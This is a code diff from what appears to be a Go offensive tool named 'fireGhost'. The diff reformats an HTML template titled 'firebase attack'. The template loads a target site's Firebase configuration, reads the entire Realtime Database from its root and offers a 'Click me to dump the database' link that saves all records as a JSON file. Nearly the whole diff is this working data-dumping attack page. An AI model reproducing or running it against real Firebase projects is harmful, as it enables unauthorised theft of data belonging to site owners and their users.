@@ -202,45 +202,52 @@ func (fire *fireGhost) generateHTML(w io.Writer) *fireGhost {
 		Config: fire.result,
 	}
 	page := `
-	<html>
-	<head>
-	<title>{{.Host}} || firebase attack</title>
-	<script src="//cdn.jsdelivr.net/npm/eruda" onload="eruda.init()"></script>
-	<meta name="viewport" content="initial-scale=1">
-<script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-auth.js"></script>
-<script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-database.js"></script>
-	</head>
-	<body><a href="#" id="st">Connecting...</p><body>
-	<script>
-	{{.Config}}
-	</script>
-	<script>
-	function download(text, name, type) {
-  var a = document.getElementById("st");
-  var file = new Blob([text], {type: type});
-  a.href = URL.createObjectURL(file);
-  a.download = name;
-}
-	var total = [];
-	var query = firebase.database().ref().orderByKey();
-query.once("value")
-  .then(function(snapshot) {
-document.getElementById("st").innerHTML="Getting Data...";
-var n = 0;
-    snapshot.forEach(function(childSnapshot) {
-    total.push(childSnapshot);
-	n=n+1;
-      return false;
-  });
-document.getElementById("st").innerHTML= "Click me to dump the database"
-document.getElementById("st").onclick = function(){
-download(JSON.stringify(total), document.title+'.json', 'application/json')
-};
-})
-.catch(function(err){console.log(err)});
-	</script>
-	`
+<html>
+   <head>
+      <title>{{.Host}} || firebase attack</title>
+      <script src="//cdn.jsdelivr.net/npm/eruda" onload="eruda.init()"></script>
+      <meta name="viewport" content="initial-scale=1">
+      <script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-app.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-auth.js"></script>
+      <script src="https://www.gstatic.com/firebasejs/5.4.1/firebase-database.js"></script>
+   </head>
+   <body>
+	  <a style="font-size:300%; color:#333; text-decoration:none;" href="#" id="st">Connecting...</p>
+      <body>
+         <script>
+            {{.Config}}
+         </script>
+         <script>
+            function download(text, name, type) {
+            var a = document.getElementById("st");
+            var file = new Blob([text], {type: type});
+            a.href = URL.createObjectURL(file);
+            a.download = name;
+            }
+            var total = [];
+            var query = firebase.database().ref().orderByKey();
+            query.once("value")
+            .then(function(snapshot) {
+            document.getElementById("st").innerHTML="Getting Data...";
+            var n = 0;
+            snapshot.forEach(function(childSnapshot) {
+            total.push(childSnapshot);
+            n=n+1;
+            return false;
+            });
+            document.getElementById("st").innerHTML= "Click me to dump the database"
+            document.getElementById("st").onclick = function(){
+            download(JSON.stringify(total), document.title+'.json', 'application/json')
+            };
+            })
+            .catch(function(err){
+            document.getElementById("st").innerHTML= err
+            console.log(err)
+            });
+         </script>
+	</body>
+</html>
+`
 	t, err := template.New("todos").Parse(page)
 	if err != nil {
 		fire.err = err
